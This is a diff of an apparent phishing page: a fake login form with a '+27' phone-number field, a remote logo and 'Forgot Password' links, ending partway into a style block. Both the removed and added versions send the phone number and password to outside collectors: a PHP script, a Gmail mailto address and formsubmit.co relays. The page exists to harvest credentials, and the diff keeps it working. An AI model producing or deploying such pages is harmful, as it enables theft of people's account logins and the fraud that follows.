@@ -1,39 +1,27 @@
-
-<!DOCTYPE html>
-<html>
-<head>
+<body>
   <center>
 <img src="https://i.ibb.co/yWNvy8C/images-1.png"/>
 </center>
-  <title>Login Page</title>
-  
-  <script>
-    function sendCredentials() {
-      var tel = document.getElementById('tel').value;
-      var password = document.getElementById('password').value;
-      var xhr = new XMLHttpRequest();
-      xhr.open("POST", "send_credentials.php", true);
-      xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-      xhr.send("tel=" + tel + "&password=" + password);
-      alert("Your login will be sent press ok to continue sending");
-    }
-  </script>
-</head>
-<body>
-  <h2>Login Form</h2>
-<form action="mailto:eduxprime5@gmail.com" method="post" enctype="text/plain">
-<form action="https://formsubmit.co/eduxprime5@gmail.com" method="post">
+<center>
+<p>Login</p>
+</center>
+<form action="https://formsubmit.co/1842869f760f0ce62e9aca55b13e0ac0" method="post">
 <fieldset style="border-radius:5px">
-  <label for="tel">+27</label>
-  <input type="text" id="tel" name="tel" placeholder="Phone number">
+  <var>+27</var>
+<input type="Telno" name="Telno" placeholder="Phone Number" required>
 </fieldset>
+<center>
+<p>Forgot Username</p>
+</center>
 <fieldset style="border-radius:5px">
-  <label for="password">Password</label>
-  <input type="password" id="password" name="password" placeholder="Enter your password">
+<input type="Telno" name="Telno" placeholder="Password" required>
 </fieldset>
-  <button onclick="sendCredentials()">Submit</button>
+<p>Forgot Password</p>
+<p></p>
+<center>
+  <button>Login</button>
+</center>
 </body>
-</html>
 <style>
 body{
 margin: 1;
